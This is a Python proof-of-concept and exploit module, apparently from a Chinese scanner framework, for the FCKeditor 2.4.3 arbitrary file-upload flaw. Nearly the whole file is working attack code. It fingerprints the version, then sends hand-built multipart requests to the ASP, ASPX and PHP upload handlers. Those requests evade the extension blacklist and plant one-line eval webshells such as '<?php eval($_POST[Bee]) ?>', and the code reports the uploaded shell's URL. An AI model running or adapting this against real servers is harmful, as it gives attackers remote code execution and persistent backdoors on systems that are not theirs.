#!/usr/bin/env python
# coding:utf-8


import re
import socket
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc' : {
            'id' : 'poc-2015-0031',
            'name' : 'FCKeditor <= 2.4.3 /upload.asp File Upload POC & Exploit',
            'author' : 'r0gent',
            'create_date' : '2015-02-04',
        },
        # 协议相关信息
        'protocol' : {
            'name' : 'http',
            'port' : [80],
            'layer4_protocol' : ['tcp'],
        },
        # 漏洞相关信息
        'vul' : {
            'app_name' : 'FCKeditor',  # 漏洞所涉及的应用名称
            'vul_version' : ['<=2.4.3'],  # 受漏洞影响的应用版本
            'type': 'File Upload',  # 漏洞类型
            'tag': ['FCKeditor漏洞', 'FCK编辑器文件上传漏洞', 'asp', 'php', 'aspx'],  # 漏洞相关tag
            'desc': 'fckeditor <= 2.4.3版本, upload.asp文件为黑名单过滤, 可绕过上传',  # 漏洞描述
            'references': ['',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        host = args['options']['target'] + args['options']['path']
        version_number = cls.get_version(host)

        if version_number <= '2.4.3':
            args['success'] = True
            args['poc_ret']['reason'] = '此版本为' + str(version_number) + '符合漏洞利用'
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        Path = args['options']['path']
        host = url + Path
        if url.startswith('http://'):
            url_noheader = url[7:]

        for script_type in ['asp', 'aspx', 'php']:
            if script_type == 'asp':
                shell_name = 'css3.cer'
                shell_content = '<%eval request("Bee")%>'
                path = host + 'editor/filemanager/upload/asp/upload.asp'
            elif script_type == 'aspx':
                shell_name = 'css3.aspx '
                shell_content = '<%@ Page Language="Jscript"%><%eval(Request.Item["Bee"],"unsafe");%>'
                path = host + 'editor/filemanager/upload/aspx/upload.aspx'
            elif script_type == 'php':
                shell_name = 'css3.php '
                path = host + 'editor/filemanager/upload/php/upload.php'
                shell_content = '<?php eval($_POST[Bee]) ?>'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((url_noheader, 80))
            s.settimeout(8)

            payload = '-----------------------------20537215486483\r\n'
            payload += 'Content-Disposition: form-data; name="NewFile"; filename="%s"\r\n' % (shell_name)
            payload += 'Content-Type: image/jpeg\r\n\r\n'
            payload += 'GIF89a\r\n'
            payload +='%s\r\n\r\n\r\n' % (shell_content)
            payload += '-----------------------------20537215486483--\r\n'
            payload_length = len(payload)

            packet = 'POST ' + path + ' HTTP/1.1\r\n'
            packet += 'HOST: ' + url_noheader + '\r\n'
            packet += 'Connection: Close\r\n'
            packet += 'Content-Type: multipart/form-data; boundary=---------------------------20537215486483\r\n'
            packet += 'Content-Length: %d' % payload_length+'\r\n'
            packet += '\r\n'
            packet = packet + payload

            s.send(packet)
            data = ''
            while True:
                buf = s.recv(1024)
                if not buf:
                    break
                data += buf
            s.close()
            re_shellurl = re.compile('OnUploadCompleted\(.+\)')
            shellurl = re_shellurl.findall(data)[0]
            shellurl = re.findall('../(\w.+?)"', shellurl)
            if len(shellurl) > 0:
                break
        if len(shellurl)>0:
            args['success'] = True
            args['poc_ret']['vul_url'] = url + '/' + shellurl[0]
            return args
        else:
            args['success'] = False
            print '[-]Sorry i faild with Old version exp --- <<' + script_type + '>>'
            return args

    @classmethod
    def get_version(cls, fck_url):
        try:
            url_dic = dict()
            version_url = fck_url + '/editor/dialog/fck_about.html'
            print version_url
            version_resp = urllib2.urlopen(version_url).read()
            re_version = re.compile('<b>(\d\.\d[\.\d]*).{0,10}<\/b>')
            parr = re_version.findall(version_resp)
            print '[+]The fck version is %s'%parr[0]
            return parr[0]
        except:
            return '8.8.8'

    def _init_user_parser(self):
        self.user_parser.add_option('-p', '--path',
                                    action = 'store', dest = 'path', default = None, help = 'please input the FCKEditor Path !')

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())